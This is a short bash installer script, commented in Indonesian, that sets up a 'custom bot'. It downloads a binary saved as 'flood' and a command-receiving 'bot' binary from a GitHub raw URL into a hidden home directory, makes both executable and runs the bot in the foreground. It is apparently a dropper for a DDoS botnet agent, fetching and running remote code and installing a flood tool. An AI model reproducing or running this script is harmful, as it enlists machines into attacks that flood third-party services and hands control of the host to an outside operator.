#!/usr/bin/env bash
# ==============================================================================
# Lsetup — custom bot: download biner L, chmod, lalu run bot (foreground).
# Bot versi ini punya debug: "[+] Command masuk: ..." dan heartbeat PING/PONG.
# ==============================================================================
set -e

REPO_BASE="https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main"
TARGET_DIR="${HOME}/.lsetup"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

download_file() {
    URL="$1"
    DEST="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "${URL}?t=$(date +%s)" -o "${DEST}"
    elif command -v wget >/dev/null 2>&1; then
        wget -q "${URL}?t=$(date +%s)" -O "${DEST}"
    else
        return 1
    fi
}

echo "=================================================="
echo "            Initializing Lsetup                   "
echo "=================================================="

# ---- biner L (flood) ----
L_OK=0
if [ -f "${SCRIPT_DIR}/L" ]; then
    echo "[*] Menggunakan biner L lokal..."
    cp -f "${SCRIPT_DIR}/L" "./flood"
    L_OK=1
else
    echo "[*] Download biner L..."
    if download_file "${REPO_BASE}/Lsetup/L" "./flood" && [ -s "./flood" ]; then
        L_OK=1
    fi
fi

chmod +x "./flood" 2>/dev/null || true
echo "[+] Biner L siap: $(ls -la ./flood | awk '{print $5}') bytes"

# ---- bot biner ----
BOT_OK=0
if [ -f "${SCRIPT_DIR}/bot" ]; then
    echo "[*] Menggunakan biner bot lokal..."
    cp -f "${SCRIPT_DIR}/bot" "./bot"
    BOT_OK=1
else
    echo "[*] Download biner bot..."
    if download_file "${REPO_BASE}/Lsetup/bot" "./bot" && [ -s "./bot" ]; then
        BOT_OK=1
    fi
fi
chmod +x "./bot" 2>/dev/null || true

if [ ! -x ./flood ]; then
    echo "[!] biner L gagal didapat. Aborting."
    exit 1
fi
if [ ! -x ./bot ]; then
    echo "[!] biner bot gagal didapat. Aborting."
    exit 1
fi

echo "[+] Menjalankan bot (debug: command masuk + heartbeat)..."
echo "=================================================="
exec ./bot